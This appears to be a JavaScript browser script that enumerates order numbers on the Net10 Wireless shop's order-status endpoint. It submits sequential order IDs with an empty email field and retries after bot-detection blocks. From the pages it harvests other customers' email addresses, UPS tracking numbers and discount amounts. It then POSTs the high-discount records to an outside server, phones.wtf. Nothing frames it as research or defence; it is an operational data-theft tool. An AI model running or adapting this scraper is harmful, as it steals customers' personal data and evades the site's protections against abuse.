if(typeof(emailreg)=='undefined') { 
var emailreg=/(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:(2(5[0-5]|[0-4][0-9])|1[0-9][0-9]|[1-9]?[0-9]))\.){3}(?:(2(5[0-5]|[0-4][0-9])|1[0-9][0-9]|[1-9]?[0-9])|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])/g;
class dataFinder
{
    constructor(oid = 103595580,speed = 5) 
	{
		this.ooi=[];
		this.orderNumber = oid;
        this.totalChecked = 0;
		this.speed = speed;
    	this.ups;
        this.discount;
        this.tictok;
		this.fails = 0;
		this.failsInARow = 0;
		this.stopped = true;
		this.stop = function () 
        {
            clearInterval(this.tictok);
            this.save();
        }
        
    	this.start = function () 
        {
            this.tictok=this.tic(this.orderNumber);  this.stopped = false;			
        }
	}


	rate(speed)
	{
		if(!this.stopped) {  
		this.stop();
		this.speed = speed;
		this.start(); }
		else { this.speed = speed; }
	}
	tic()
    {
		var intvl=setInterval(()=>{ this.checkOrderNumber(this.orderNumber); },this.speed*1000); 
        return intvl; 
	}

    
	async handleResponse(x,id)
	{
		if(x.match(/ROBOTS"/)) 
		{
			this.fails++;
			this.failsInARow++;
			this.stop(); console.log("FAIL!"); 
			if(this.failsInARow<4)  { console.log(this.failsInARow + " fail in a row... Trying to restart...");
				var failwindow=window.open("https://shop.net10wireless.com/shop/TFOrderStatus","fail");
			setTimeout(()=>{ failwindow.close(); this.start();  },3000); } else { console.log("Too many Fails. Stopping.");  }
		}
		else 
		{
			this.orderNumber++;
            this.totalChecked++;
			this.failsInARow = 0;
        if(!x.match(/information and try again|contact your site administrator/))
        {
            var discount = 0;
            var email = x.replaceAll(/diannaron5819@yahoo.com/g,"").match(emailreg);
            if(email!=null) { email = email[0]; }
            var ups=x.match(/1Z\w{16}/g);
            this.ups = ups;
            
            var upsjson=null;
            if(ups!=null) 
            { 
                var upsjson = await fetch("https://phones.wtf/api/ups/?q="+ups[0])
                .then((response)=>response.json()).then((jsn)=>
                {
                    return jsn.TrackResponse.Shipment.Package.ReferenceNumber[0].Value;
                }).catch((err)=>{ return false; });
            }
            else { var ups=[null,null]; };
            var totals=x.replaceAll(/[^\d\$\)\(\.]/g,"").match(/([(]{1}\$\d+[\.]\d+[)]{1})/g);
                
            if(totals!=null)
            {
                discount = parseFloat(totals[0].replaceAll(/[^\d\.]/g,"")); 
            }
            var disc= discount;
            if(discount<49.01) { var disc = "2low"; }
            var json={"EMailId":email,"OrderId":id,"Discount":discount,"UPSId":ups[0],"BrandId":upsjson}; 
            this.discount=discount;
            if(discount>49) 
            {
                this.ooi.push(json);
                this.save();
            }
        }

        }
    }
    
    async save()
    {
        var type="scrape2";
        var data={"ooi":this.ooi,"last":this.orderNumber};
        var send={"type":type,"data":data};
        var body = JSON.stringify(send);
        var saveOutput = await fetch("https://phones.wtf/orders/",{"body":body,"method":"POST"});
        var so = await saveOutput.text();
      
    }
    
	checkOrderNumber(oid) 
    {
        var fetchBody = "storeId=20001&catalogId=10551&langId=-1&";
            fetchBody +="viewTaskName=TFOrderStatusDisplay&";
            fetchBody +="errorViewName=TFOrderStatusForm&orderId="+oid+"&email1=";
        
		fetch(location.origin+"/shop/TFOrderStatus",
		{
			"headers": {"content-type": "application/x-www-form-urlencoded"},"body":fetchBody,"method": "POST"})
            .then((response)=>response.text())
            .then((text)=>this.handleResponse(text,oid));
	}
} }